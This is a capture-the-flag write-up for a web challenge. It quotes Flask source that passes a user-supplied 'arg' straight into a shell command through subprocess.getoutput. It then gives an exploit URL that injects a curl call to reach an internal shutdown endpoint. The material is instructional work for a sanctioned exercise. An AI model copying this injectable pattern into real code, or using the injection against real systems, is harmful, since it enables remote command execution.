# Introduction
This is a rather simple web challange to get familliar with how to find paths and look into soruce code for how a function works

## Challange Discription

Agent, we've identified what appears to be ARIA's control panel. Luckily there's no authentication required to interact with it. Can you take down ARIA once and for all?
https://uscybercombine-s4-control-panel.chals.io/
File : [Source_Code](https://github.com/salarsalimi/CTF/tree/main/US%20Cyber%20Open%20Season%20IV/resources/control-panel/control-panel)

## Webpage 

After openning the dashboard we see it's a simple page that has 4 links each one making a request to same URL with a parameter

![](../assets/Control_Panel_1.png)

For example when we open first link we are sending this parameter like bellow:

![](../assets/Control_Panel_2.png)




## Step 1

End link seems to be important so it's time to take a look at source code to see how our parameter is working
From code bellow we see that the final link must be used with second parameter named **arg**

```python
from flask import Flask, render_template, request
from subprocess import getoutput

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    command = request.args.get("command")
    if not command:
        return render_template("index.html")
    
    arg = request.args.get("arg")
    if not arg:
        arg = ""

    if command == "list_processes":
        return getoutput("ps")
    elif command == "list_connections":
        return getoutput("netstat -tulpn")
    elif command == "list_storage":
        return getoutput("df -h")
    elif command == "destroy_humans":
        return getoutput("/www/destroy_humans.sh " + arg)
    
    return render_template("index.html")
```



## Step 2

We take a look at getoutput defenition in subprocces library to see how it works
- it seems like it is executing our commands 

![](../assets/Control_Panel_3.png)

So basically we have RCE but what command to execute ? 

## Step 3

Now that we know what parameter to use and that it has RCE but we must know what to give it too !!
For this we look in destroyer.py and see this lines of code in it:

```python
elif self.path == '/shutdown':
				resp_ok()
				self.wfile.write(get_json({'status': 'shutting down...'}))
				self.wfile.write(get_json({'status': 'SIVBGR{no-flag-4-u}'}))
				return
```

So we must call this url
> http://localhost:3000/shutdown 

We achive this with this url call :
> https://uscybercombine-s4-control-panel.chals.io/?command=destroy_humans&arg=curl%20-s%20localhost:3000/shutdown

![](../assets/Control_Panel_4.png)